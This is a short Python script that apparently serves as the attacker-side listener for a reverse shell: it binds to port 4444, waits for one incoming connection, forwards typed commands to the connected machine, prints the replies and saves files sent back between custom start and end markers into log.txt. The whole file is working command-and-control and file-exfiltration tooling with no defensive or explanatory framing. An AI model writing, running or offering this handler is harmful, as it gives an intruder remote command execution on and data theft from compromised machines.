import socket
import threading
import sys

PORT = 4444

isFile = False
def receive_data(conn):
    while True:
        try:
            bytes = conn.recv(4096)
            if not bytes:
                print("\nConnection closed.")
                break
            sys.stdout.write(data_handler(bytes.decode(errors='ignore')))
            sys.stdout.flush()
        except Exception as e:
            break
    try:
        conn.shutdown(socket.SHUT_RDWR)
        conn.close()
    except:
        pass

def data_handler(data):
    global isFile
    match data:
        case "0FILE_TRANSFER_BOF":
            isFile = True
            with open("log.txt", "w") as f:
                pass
            return "Transferring File...\n"
        case "0FILE_TRANSFER_EOF":
            isFile = False
            return "File Finished Transfer\n>"
        case _:
            if isFile:
                with open("log.txt", "a") as f:
                    f.write(data)
                return "Received...\n"
            else:
                return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT))
s.listen(1)
print(f"[*] Listening on {PORT}...")
conn, addr = s.accept()
print(f"[*] Connection received from {addr}\n")
threading.Thread(target=receive_data, args=(conn,), daemon=True).start()
while True:
    try:
        cmd = input()
        if cmd.lower() in ['exit', 'quit']:
            conn.close()
            break
        if cmd:
            conn.send(cmd.encode() + b'\n')
    except KeyboardInterrupt:
        conn.close()
        break
print("Client disconnected.")